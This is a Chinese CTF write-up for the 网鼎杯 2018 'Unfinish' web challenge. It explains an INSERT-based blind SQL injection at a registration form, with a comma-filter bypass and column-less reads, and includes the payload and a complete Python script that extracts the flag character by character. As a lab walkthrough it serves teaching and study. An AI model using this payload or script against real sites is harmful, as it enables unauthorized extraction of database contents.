---
title: 网鼎杯 2018 - Web - Unfinish
date: 2026-11-14 18:43:00
categories:
  - CTF
  - 网鼎杯 2018
  - Web
tags:
  - insert注入
  - 盲注
  - 无列名注入
  - 逗号绕过
cover: /img/cover/pink-hair-flower-girl.jpg
description: 网鼎杯 2018 Web 题，注册处 insert 注入加盲注：username 未转义单引号，用 0+ascii+substr 把查询结果转 ascii 写入用户名，登录页回显配合无列名注入逐字符读 flag。
keywords:
  - Unfinish
  - insert注入
  - 盲注
  - 无列名
  - 数字注入
ai: >-
  Unfinish 是网鼎杯 2018 的 Web 注入题，页面仅提供登录入口且万能密码无效，目录扫描可发现 register.php 注册页。审计注册逻辑发现 username 字段只经过一个黑名单 waf 过滤（拦截 information、逗号等），却没有用 addslashes 转义单引号，因此注册阶段即可把 payload 直接拼接进 insert 语句，属于 insert 注入而非二次注入。利用 MySQL 中字符串以加号连接会被当作数字运算的特性，构造 0 加 ascii 加 substr 的表达式，让查询结果作为数字参与运算，结果以 ascii 数值形式写入 username 字段。登录后页面在用户名标签处回显这个数值，于是构成盲注通道。flag 存放在独立表中，通过 select * from flag 无需知道列名即可配合 substr 逐字符读取；又因逗号被过滤，改用 substr 的 from N for 1 语法替代。编写脚本逐位置注册、登录、正则提取回显数值并转成字符，循环拼接即可得到完整 flag。全题核心是写入阶段注入、数字转换回显与无列名盲注的组合。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 网鼎杯 2018 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

考点：`insert 注入` + `数字注入` + `盲注`。

## 信息收集

打开题目只有一个登录界面（字段 `email` + `password`），检查源码无有用信息，万能密码登录无效。

目录扫描发现注册界面 `register.php`（字段 `email` + `username` + `password`）。

## 漏洞分析

### insert 注入

注册时用户名 `username` 入库时过滤不严，只调用了 `waf` 函数对黑名单字符串进行判断（过滤 `information`、逗号 `,` 等），但**没有用 `addslashes` 转义单引号**。因此可以构造 `insert` 注入。

后端 SQL 大致为：

```sql
insert into users (email, username, password) values ('$email', '$username', '$password')
```

**注意**：这题本质上不是二次注入，而是 **insert 注入**（写入阶段即可注入，payload 直接拼接进 insert 语句）。

### 数字注入原理

MySQL/MariaDB 中，字符串包裹的数字如果以 `+` 号连接，会被当作数字处理进行运算：

```sql
MariaDB [web]> select '1'+'1';
+---------+
| '1'+'1' |
+---------+
|       2 |
+---------+
```

因此构造 payload 时，用 `0'+查询+'0` 的形式，让查询结果（ascii 值）作为数字参与 `+` 运算，最终 username 字段存入的是运算后的**数字**。

### 盲注 payload

flag 在独立的 `flag` 表中，通过 `+` 运算进行无列名获取：

```text
username = 0'+ascii(substr((select * from flag) from N for 1))+'0
```

其中：

- `substr((select * from flag) from N for 1)`：取 flag 第 N 个字符（无列名，`select *`）
- `ascii(...)`：转 ascii 值
- `0'+...+'0`：字符串拼数字，`+` 运算转数字
- 结果（ascii 数值）写入 username 字段

注册后登录，登录页面 `span.user-name` 回显 username（即 ascii 数值），逐字符读取 flag。

## 利用过程

1. 扫到 `register.php`，确认注册处 username 未转义单引号。
2. 构造 `0'+ascii(substr((select * from flag) from N for 1))+'0` 作为 username 注册。
3. 用同邮箱密码登录，正则提取 `user-name` 标签回显的数值，转成字符。
4. 逐位置循环，遇 `}` 结束，拼接得到 flag。

## 完整 EXP

> 归档 payload（脱敏后重组）。核心 payload：

```text
注册时 username 字段（insert 注入点）：
username = 0'+ascii(substr((select * from flag) from N for 1))+'0

登录后 span.user-name 回显 ascii 数值，逐字符盲注。

关键点：
- flag 表名：flag
- 过滤：information、逗号（,）
- 数字注入：'0'+查询+'0' 利用 + 运算转数字
- 无列名：select * from flag
- 逗号绕过：substr(x from N for 1)
```

完整 Python exp：

```python
# -*- coding: utf-8 -*-
import urllib.request, urllib.parse, sys, io, re, http.cookiejar, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='ignore')

base = "http://target:8080"

def new_session():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(opener, path, data):
    d = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(base + path, data=d)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    r = opener.open(req, timeout=20)
    return r.status, r.read().decode('utf-8', 'ignore')

def get_char(pos):
    opener = new_session()
    email = "inj_%d@1.com" % pos
    username = "0'+ascii(substr((select * from flag) from %d for 1))+'0" % pos
    password = "1"
    post(opener, "/register.php", {"email": email, "username": username, "password": password})
    s, body = post(opener, "/login.php", {"email": email, "password": password})
    m = re.search(r'user-name["\']>\s*(\d+)', body)
    return int(m.group(1)) if m else None

flag = ""
for pos in range(1, 50):
    v = get_char(pos)
    if v is None or v == 0:
        break
    flag += chr(v)
    if chr(v) == '}':
        break

print(flag)
```

### 读取结果

逐字符盲注得到（示例前几位）：

```text
C=67, T=84, F=70, 2=50, {=123, e=101, f=102, 6=54, ...
```

最终 flag 为带 uuid 的 CTF2 格式串，已脱敏。

## Flag

脱敏后：`flag{xxxx}`。原值为 CTF2 格式，由 insert 注入配合 ascii 数值回显逐字符盲注得到。

## 踩坑与总结

1. **insert 注入**：`username` 入库时仅 `waf` 黑名单过滤（过滤 `information`、逗号），未转义单引号，可直接拼接构造 insert 注入。
2. **数字注入**：`'0'+查询+'0'` 利用字符串拼数字被当作数字运算的特性，把查询结果转成数字存入。
3. **无列名盲注**：`select * from flag` 无需知道列名，配合 `ascii(substr(...))` 逐字符读取。
4. **逗号过滤绕过**：`substr(... from N for 1)` 用 `from/for` 语法替代 `substr(x, N, 1)` 的逗号写法。
5. 每个位置用独立会话（新邮箱）注册+登录，避免状态串扰；回显数值为 ascii，需 `chr()` 还原字符。
